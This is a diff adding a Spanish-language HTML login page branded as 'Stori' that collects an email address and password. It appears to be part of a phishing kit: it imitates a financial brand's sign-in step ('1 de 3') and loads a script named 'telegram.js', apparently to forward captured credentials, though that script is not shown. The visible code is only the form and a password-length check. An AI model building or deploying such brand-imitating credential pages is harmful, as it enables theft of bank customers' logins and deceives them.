@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Stori - Iniciar sesión</title>
+    <link rel="icon" href="icon.png" type="image/png">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <button class="back-button" aria-label="Volver">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"/></svg>
+            </button>
+            <img style="width: 230px;" src="assets/LogSto.svg" alt="Stori" class="logo">
+            <span class="page-number">1 de 3</span>
+        </header>
+        
+        <main>
+            <h1>Iniciar sesión</h1>
+            <p>Ingresa tu correo y tu contraseña</p>
+            
+            <form id="signup-form">
+                <div class="input-group">
+                    <input type="email" id="email" name="mail" placeholder="Correo electrónico" class="m" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="pas" name="pas" placeholder="Contraseña" required>
+                    <button type="button" id="toggle-password" aria-label="Mostrar contraseña">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </button>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="accept-privacy">
+                    <label for="accept-privacy">Acepto el <a href="#">aviso de privacidad</a></label>
+                </div>
+                
+                <p class="legal-info">Consulta nuestra <a href="#">información legal</a></p>
+                
+                <button type="submit" id="continuar" class="submit-button" disabled>Continuar</button>
+            </form>
+            
+            <a href="#" class="login-link">Ya tengo cuenta Stori</a>
+        </main>
+    </div>
+
+    <script src="scriptt.js"></script>
+    <script src="telegram.js"></script>
+    <script>
+        // Validación de contraseña
+        const input = document.getElementById('pas');
+        const boton = document.getElementById('continuar');
+        
+        input.addEventListener('input', function() {
+            if (input.value.length > 3) {
+                boton.style.backgroundColor = '#00d180';
+                boton.disabled = false;
+            } else {
+                boton.style.backgroundColor = ''; 
+                boton.disabled = true;
+            }
+        });
+    </script>
+</body>
+</html>
